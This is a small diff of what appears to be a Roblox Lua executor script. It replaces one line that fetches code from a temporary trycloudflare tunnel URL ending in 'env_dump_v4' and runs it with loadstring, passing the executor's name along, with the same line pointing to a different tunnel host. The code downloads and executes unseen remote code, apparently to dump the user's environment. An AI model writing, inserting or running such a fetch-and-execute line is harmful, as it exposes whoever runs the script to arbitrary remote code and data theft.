@@ -20,4 +20,4 @@ pcall(function()
     end
 end)
 
-loadstring(game:HttpGet("https://views-unlikely-parents-incurred.trycloudflare.com/env_dump_v4" .. "?executor=" .. executorName))()
+loadstring(game:HttpGet("https://grocery-assisted-alerts-gba.trycloudflare.com/env_dump_v4" .. "?executor=" .. executorName))()
